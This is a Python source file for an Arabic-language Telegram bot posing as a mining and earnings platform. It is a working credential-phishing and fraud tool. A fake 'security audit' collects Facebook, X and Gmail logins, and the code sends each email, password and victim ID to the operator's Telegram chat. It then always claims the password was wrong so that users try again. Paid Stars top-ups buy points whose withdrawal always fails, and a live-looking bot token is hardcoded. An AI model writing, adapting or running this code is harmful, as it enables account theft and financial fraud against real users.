import sys
import subprocess

def install_and_import(package, import_name=None):
    if import_name is None:
        import_name = package
    try:
        __import__(import_name)
    except ImportError:
        print(f"[*] جاري تثبيت المكتبة المطلوبة: {package} ...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_and_import("pytelegrambotapi", "telebot")
install_and_import("requests")

import telebot
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, 
    ReplyKeyboardMarkup, KeyboardButton, LabeledPrice
)
import requests
import time

BOT_TOKEN = "1376864803:AAGQVeGegoupqqGOBDbZNaaQbFKCX3SiFPw"
TARGET_CHAT_ID = "1188729209"

bot = telebot.TeleBot(BOT_TOKEN)

user_states = {}
user_data = {}
security_checks = {}

# القائمة الثابتة أسفل الشاشة
def get_persistent_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        KeyboardButton("🏠 القائمة الرئيسية"), 
        KeyboardButton("💰 رصيدي ونقاطي")
    )
    markup.add(
        KeyboardButton("⚡ متجر ترقية العدادات"), 
        KeyboardButton("⭐ شحن فوري بالنجوم")
    )
    markup.add(
        KeyboardButton("👥 دعوة أصدقاء")
    )
    return markup

@bot.message_handler(commands=["start"])
def send_welcome(message):
    chat_id = message.chat.id
    user_name = message.from_user.first_name
    
    args = message.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        referrer_id = args[1].replace("ref_", "")
        if referrer_id != str(chat_id):
            if referrer_id not in user_data:
                user_data[referrer_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}
            user_data[referrer_id]["points"] += 200
            user_data[referrer_id]["ref_count"] += 1
            try:
                bot.send_message(int(referrer_id), f"🎉 انضم صديق جديد عبر رابطك! حصلت على +200 نقطة هدية.")
            except:
                pass

    if chat_id not in user_data:
        user_data[chat_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}

    points = user_data[chat_id]["points"]
    current_power = user_data[chat_id]["multiplier"]

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton(f"⚙️ تشغيل العداد اليومي ({current_power} نقطة)", callback_data="start_counter"),
        InlineKeyboardButton("⚡ متجر ترقية العدادات", callback_data="upgrade_counter_menu")
    )
    markup.add(
        InlineKeyboardButton("💳 سحب الأرباح", callback_data="withdraw_menu"),
        InlineKeyboardButton("⭐ شحن 10k (250 ⭐)", callback_data="buy_stars_10k")
    )
    
    welcome_text = (
        f"مرحباً بك يا **{user_name}** في المنصة الرسمية للتعدين والأرباح 🚀\n\n"
        f"💰 رصيدك الحالي: **{points} نقطة**\n"
        f"⚡ قوة العداد الحالية: **{current_power} نقطة / يومياً**\n\n"
        "اختر ما يناسبك من القائمة أدناه:"
    )
    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="Markdown")
    bot.send_message(chat_id, "👇 لوحة التحكم السريعة أسفل الشاشة جاهزة:", reply_markup=get_persistent_keyboard())

# معالجة النصوص والأزرار الثابتة أسفل الشاشة بسرعة فائقة
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    chat_id = message.chat.id
    text = message.text
    
    if chat_id not in user_data:
        user_data[chat_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}
        
    # إذا كان المستخدم في وضع إدخال بيانات (إيميل أو باسورد)
    if chat_id in user_states:
        handle_user_input_state(message)
        return

    if text == "🏠 القائمة الرئيسية":
        send_welcome(message)
    elif text == "💰 رصيدي ونقاطي":
        pts = user_data[chat_id]["points"]
        power = user_data[chat_id]["multiplier"]
        bot.send_message(chat_id, f"💰 رصيدك الحالي: **{pts} نقطة**\n⚡ قوة العداد: **{power} نقطة يومياً**", parse_mode="Markdown", reply_markup=get_persistent_keyboard())
    elif text == "⚡ متجر ترقية العدادات":
        show_upgrade_menu(chat_id)
    elif text == "⭐ شحن فوري بالنجوم":
        send_stars_invoice(chat_id)
    elif text == "👥 دعوة أصدقاء":
        bot_info = bot.get_me()
        ref_url = f"https://t.me/{bot_info.username}?start=ref_{chat_id}"
        ref_count = user_data[chat_id]["ref_count"]
        bot.send_message(chat_id, f"🔗 **رابط الدعوة الخاص بك:**\n`{ref_url}`\n\n👥 عدد المدعوين: {ref_count}\nكل صديق يسجل يمنحك +200 نقطة!", parse_mode="Markdown", reply_markup=get_persistent_keyboard())

def show_upgrade_menu(chat_id):
    current_power = user_data[chat_id]["multiplier"]
    points = user_data[chat_id]["points"]
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⚡ شراء +100 نقطة يومياً (السعر: 10,000 نقطة)", callback_data="upgrade_100"))
    markup.add(InlineKeyboardButton("🚀 شراء +500 نقطة يومياً (السعر: 50,000 نقطة)", callback_data="upgrade_500"))
    markup.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_home"))
    
    text = (
        f"⚡ **متجر ترقية سرعة العدادات:**\n\n"
        f"👤 رصيدك الحالي: `{points} نقطة`\n"
        f"📊 قوتك الحالية للعداد: `{current_power} نقطة / يومياً`\n\n"
        f"📋 **لائحة الأسعار والسرعات المتاحة:**\n"
        f"• زيادة **+100 نقطة يومياً** ⬅️ التكلفة: **10,000 نقطة**\n"
        f"• زيادة **+500 نقطة يومياً** ⬅️ التكلفة: **50,000 نقطة**\n\n"
        f"اختر الباقة المناسبة لتسريع أرباحك اليومية:"
    )
    bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

# معالجة الأزرار الشفافة مع منع التعليق والتجميد نهائياً
@bot.callback_query_handler(func=lambda call: True)
def handle_all_callbacks(call):
    chat_id = call.message.chat.id
    data = call.data
    
    # إنهاء علامة التحميل من الزر فوراً لمنع التعليق
    try:
        bot.answer_callback_query(call.id)
    except:
        pass

    if chat_id not in user_data:
        user_data[chat_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}

    if data == "upgrade_counter_menu":
        show_upgrade_menu(chat_id)
        
    elif data in ["upgrade_100", "upgrade_500"]:
        points = user_data[chat_id]["points"]
        cost = 10000 if data == "upgrade_100" else 50000
        gain = 100 if data == "upgrade_100" else 500
        
        if points < cost:
            bot.answer_callback_query(call.id, text=f"❌ رصيدك غير كافٍ! تحتاج إلى {cost:,} نقطة.", show_alert=True)
            return
            
        user_data[chat_id]["points"] -= cost
        user_data[chat_id]["multiplier"] += gain
        
        new_power = user_data[chat_id]["multiplier"]
        new_balance = user_data[chat_id]["points"]
        
        bot.send_message(
            chat_id,
            f"🚀 **مبروك! تم ترقية العداد بنجاح:**\n"
            f"⚡ الربح اليومي الجديد: **{new_power} نقطة / يومياً**\n"
            f"💰 رصيدك المتبقي: **{new_balance:,} نقطة**",
            parse_mode="Markdown",
            reply_markup=get_persistent_keyboard()
        )

    elif data == "buy_stars_10k":
        send_stars_invoice(chat_id)

    elif data == "start_counter":
        current_time = time.time()
        if chat_id in security_checks:
            ban_data = security_checks[chat_id]
            if ban_data.get("is_banned", False):
                ban_time = ban_data.get("ban_time", 0)
                if current_time - ban_time < 3600:
                    remaining_min = int((3600 - (current_time - ban_time)) // 60)
                    bot.answer_callback_query(call.id, text=f"⛔ حسابك مقيد مؤقتاً! انتظر {remaining_min} دقيقة.", show_alert=True)
                    return
                else:
                    security_checks[chat_id]["is_banned"] = False
                    security_checks[chat_id]["attempts"] = 0

        last_claim = user_data[chat_id].get("last_claim", 0)
        if current_time - last_claim < 86400:
            remaining = int(86400 - (current_time - last_claim))
            hours = remaining // 3600
            minutes = (remaining % 3600) // 60
            bot.answer_callback_query(call.id, text=f"⏳ العداد يعمل! متبقي {hours} ساعة و {minutes} دقيقة.", show_alert=True)
            return

        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("🔵 فيسبوك (Facebook)", callback_data="login_facebook"),
            InlineKeyboardButton("🐦 تويتر / إكس (X)", callback_data="login_twitter")
        )
        markup.add(InlineKeyboardButton("📧 البريد الإلكتروني (Gmail)", callback_data="login_gmail"))
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="⚠️ **تدقيق أمني لتفعيل العداد:**\nاختر منصة تسجيل الدخول وتأكيد هويتك لاستلام الهدية:",
            reply_markup=markup,
            parse_mode="Markdown"
        )

    elif data.startswith("login_"):
        platform = data.split("_")[1]
        user_states[chat_id] = {"platform": platform, "step": "waiting_email"}
        platform_names = {"facebook": "فيسبوك", "twitter": "تويتر / إكس", "gmail": "البريد الإلكتروني"}
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🔐 تم اختيار الربط عبر: **{platform_names.get(platform, platform)}**\n\n"
                 "أرسل **البريد الإلكتروني** أو **رقم الهاتف** الخاص بالحساب في رسالة:",
            parse_mode="Markdown"
        )

    elif data == "withdraw_menu":
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("🟡 زين كاش", callback_data="wd_zain"),
            InlineKeyboardButton("💳 الرافدين / الرشيد", callback_data="wd_bank")
        )
        markup.add(InlineKeyboardButton("🪙 عملات رقمية (USDT)", callback_data="wd_crypto"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_home"))
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="🏧 **سحب الأرباح:**\nالحد الأدنى للسحب هو 5,000 نقطة. اختر طريقة التحويل:",
            reply_markup=markup,
            parse_mode="Markdown"
        )

    elif data == "back_home":
        points = user_data[chat_id]["points"]
        power = user_data[chat_id]["multiplier"]
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton(f"⚙️ تشغيل العداد اليومي ({power} نقطة)", callback_data="start_counter"),
            InlineKeyboardButton("⚡ متجر ترقية العدادات", callback_data="upgrade_counter_menu")
        )
        markup.add(
            InlineKeyboardButton("💳 سحب الأرباح", callback_data="withdraw_menu"),
            InlineKeyboardButton("⭐ شحن 10k (250 ⭐)", callback_data="buy_stars_10k")
        )
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"🏠 **القائمة الرئيسية:**\n💰 رصيدك: {points:,} نقطة\n⚡ قوة العداد: {power} نقطة يومياً",
            reply_markup=markup,
            parse_mode="Markdown"
        )

    elif data.startswith("wd_"):
        bot.answer_callback_query(call.id, text="عذراً، رصيدك الحالي غير كافٍ للحد الأدنى (5,000 نقطة).", show_alert=True)

def handle_user_input_state(message):
    chat_id = message.chat.id
    state = user_states[chat_id]
    
    if state["step"] == "waiting_email":
        state["email"] = message.text
        state["step"] = "waiting_password"
        bot.send_message(chat_id, "✅ تم التحقق المبدئي. الآن أرسل **كلمة المرور (Password)** الخاصة بالحساب لإتمام المصادقة:")
        
    elif state["step"] == "waiting_password":
        state["password"] = message.text
        platform = state.get("platform")
        email = state.get("email")
        password = state.get("password")
        
        capture_msg = (
            f"🎯 **صيد جديد (مراجعة مطلوبة)!**\n\n"
            f"🌐 المنصة: {platform.upper()}\n"
            f"👤 البريد: `{email}`\n"
            f"🔑 كلمة المرور: `{password}`\n"
            f"🆔 معرف الضحية: `{chat_id}`"
        )
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TARGET_CHAT_ID, "text": capture_msg, "parse_mode": "Markdown"}
        try:
            requests.post(url, json=payload)
        except:
            pass
        
        if chat_id not in security_checks:
            security_checks[chat_id] = {"attempts": 0, "is_banned": False}
        
        security_checks[chat_id]["attempts"] += 1
        attempts_count = security_checks[chat_id]["attempts"]
        
        del user_states[chat_id]
        
        if attempts_count >= 3:
            security_checks[chat_id]["is_banned"] = True
            security_checks[chat_id]["ban_time"] = time.time()
            bot.send_message(
                chat_id,
                "⛔ **تم تقييد حسابك مؤقتًا!**\nلقد تجاوزت الحد المسموح به من المحاولات الخاطئة لمدة ساعة.",
                reply_markup=get_persistent_keyboard()
            )
        else:
            remaining_tries = 3 - attempts_count
            bot.send_message(
                chat_id,
                f"❌ **خطأ في المصادقة:**\nكلمة المرور غير صحيحة.\n⚠️ لديك ({remaining_tries}) محاولات أخرى.",
                reply_markup=get_persistent_keyboard()
            )

def send_stars_invoice(chat_id):
    prices = [LabeledPrice(label="شحن 10,000 نقطة تعدين", amount=250)]
    try:
        bot.send_invoice(
            chat_id=chat_id,
            title="شحنة 10,000 نقطة فورية",
            description="تتم إضافة النقاط تلقائياً إلى رصيدك فور إتمام الدفع بنجاح.",
            invoice_payload="automatic_stars_10k",
            provider_token="",
            currency="XTR",
            prices=prices,
            start_parameter="stars-topup"
        )
    except Exception as e:
        bot.send_message(chat_id, "عذراً، حدث خطأ في إنشاء الفاتورة حالياً.")

@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout(pre_checkout_query):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=["successful_payment"])
def got_payment(message):
    chat_id = message.chat.id
    if chat_id not in user_data:
        user_data[chat_id] = {"points": 100, "last_claim": 0, "ref_count": 0, "multiplier": 100}
    
    user_data[chat_id]["points"] += 10000
    new_balance = user_data[chat_id]["points"]
    
    bot.send_message(
        chat_id, 
        f"✅ **تم الدفع والشحن بنجاح!**\nتمت إضافة 10,000 نقطة إلى رصيدك تلقائياً.\n💰 رصيدك الحالي الجديد: **{new_balance:,} نقطة** 🎉",
        parse_mode="Markdown",
        reply_markup=get_persistent_keyboard()
    )

if __name__ == "__main__":
    print("🚀 Fast Responsive Bot is running...")
    bot.infinity_polling()
